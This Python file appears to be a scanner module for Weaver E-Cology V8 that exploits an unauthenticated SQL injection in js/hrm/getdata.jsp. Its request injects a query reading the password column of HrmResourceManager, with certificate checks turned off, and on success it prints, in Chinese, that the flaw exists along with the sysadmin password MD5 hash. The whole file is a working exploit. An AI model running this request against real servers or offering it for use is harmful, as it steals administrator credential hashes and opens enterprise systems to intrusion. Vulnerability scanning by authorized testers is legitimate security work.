import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging
import urllib3

def E_Cology_V8_Sql(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    target_url = urldata + "js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager"
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36"
    }
    try:
        urllib3.disable_warnings()
        res = requests.get(url=target_url, headers=headers, verify=False, timeout=10)
        if res.status_code == 200 and 'html' not in res.text:
            print(Vcolors.RED + "[!] 存在V8前台SQL注入\r" + Vcolors.ENDC)
            print(Vcolors.RED + "[!] 用户: sysadmin 密码MD5: {}\r".format(res.text.strip()) + Vcolors.ENDC)
        else:
            print(Vcolors.WARNING + "[x] 不存在V8前台SQL注入" + Vcolors.ENDC)
    except Exception as e:
        print(f"[0]  目标系统: {url} 存在未知错误！\n",e)
        logging.error("E_Cology_V8_Sql脚本出现异常")
  
        


